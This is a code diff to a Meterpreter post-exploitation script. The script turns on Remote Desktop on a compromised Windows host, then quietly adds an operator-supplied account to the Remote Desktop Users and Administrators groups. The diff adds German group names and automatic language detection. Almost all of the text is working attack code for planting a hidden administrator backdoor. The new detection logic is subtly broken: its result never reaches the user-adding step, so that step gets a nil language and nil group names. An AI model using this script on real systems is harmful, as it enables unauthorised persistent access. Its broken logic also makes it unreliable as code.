@@ -3,7 +3,8 @@
 # Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
 # Windows 2008 and Windows XP targets using native windows commands.
 # Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-# Version: 0.1.1
+# Support for German Systems added by L0rdAli3n debian5[at]web.de
+# Version: 0.1.2
 # Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
 #      We are still working in making this option more stable.
 ################## Variable Declarations ##################
@@ -12,6 +13,7 @@ session = client
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-e" => [ false, "Enable RDP only." ],
+	"-l" => [ true, "The language switch\n\t\tPossible Options: 'de_DE', 'en_EN' / default is: 'en_EN'" ],
 	"-p" => [ true,  "The Password of the user to add." ],
 	"-u" => [ true,  "The Username of the user to add." ],
 	"-f" => [ true,  "Forward RDP Connection." ]
@@ -22,6 +24,24 @@ def usage
 	print_line("Or:    getgui -e")
 	print(@@exec_opts.usage)
 	raise Rex::Script::Completed
+end
+
+
+def langdetect(session, lang)
+	if lang != nil
+		print_status("Language set by user to: '#{lang}'")
+	else
+		print_status("Language detection started")
+		lang = client.sys.config.sysinfo['System Language']
+		if lang != nil
+			print_status("\tLanguage detected: #{lang}")
+		else
+			print_error("\tLanguage detection failed, falling back to default 'en_EN'")
+			lang = "en_EN"
+		end
+	end
+	rescue::Exception => e
+			print_status("The following Error was encountered: #{e.class} #{e}")
 end
 
 
@@ -45,6 +65,8 @@ def enablerd(session)
 	end
 		
 end
+
+
 def enabletssrv(session)
 	tmpout = [ ]
 	cmdout = []
@@ -83,7 +105,19 @@ def enabletssrv(session)
 			print_status("The following Error was encountered: #{e.class} #{e}")
 	end
 end
-def addrdpusr(session, username, password)
+
+
+
+def addrdpusr(session, username, password, lang)
+	# Changing the group names depending on the selected language
+	case lang
+		when "en_EN"
+			rdu = "Remote Desktop Users"
+			admin = "Administrators"
+		when "de_DE"
+			rdu = "Remotedesktopbenutzer"
+			admin = "Administratoren"
+	end
 	tmpout = [ ]
 	cmdout = []
 	print_status "Setting user account for logon"
@@ -96,16 +130,16 @@ def addrdpusr(session, username, password)
 	cmdout << tmpout
 	r.channel.close
 	r.close
-	print_status "\tAdding User: #{username} to local group Remote Desktop Users"
-	r = session.sys.process.execute("net localgroup \"Remote Desktop Users\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
+	print_status "\tAdding User: #{username} to local group '#{rdu}'"
+	r = session.sys.process.execute("net localgroup \"#{rdu}\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
 	while(d = r.channel.read)
 		tmpout << d
 	end
 	cmdout << tmpout
 	r.channel.close
 	r.close
-	print_status "\tAdding User: #{username} to local group Administrators"
-	r = session.sys.process.execute("net localgroup Administrators #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
+	print_status "\tAdding User: #{username} to local group '#{admin}'"
+	r = session.sys.process.execute("net localgroup #{admin}  #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
 	while(d = r.channel.read)
 		tmpout << d
 	end
@@ -119,8 +153,6 @@ def addrdpusr(session, username, password)
 end
 
 
-
-
 def message
 	print_status "Windows Remote Desktop Configuration Meterpreter Script by Darkoperator"
 	print_status "Carlos Perez carlos_perez@darkoperator.com"
@@ -129,6 +161,7 @@ end
 # Parsing of Options
 usr = nil
 pass = nil
+lang = nil
 lport = 1024 + rand(1024)
 enbl = nil
 frwrd = nil
@@ -141,6 +174,8 @@ frwrd = nil
 			pass = val
 		when "-h"
 			usage
+		when "-l"
+			lang = val
 		when "-f"
 			frwrd = true
 			lport = val
@@ -156,9 +191,10 @@ if enbl
 
 elsif usr != nil && pass != nil
 	message
+	langdetect(session, lang)
 	enablerd(session)
 	enabletssrv(session)
-	addrdpusr(session, usr, pass)
+	addrdpusr(session, usr, pass, lang)
 
 else
 	usage
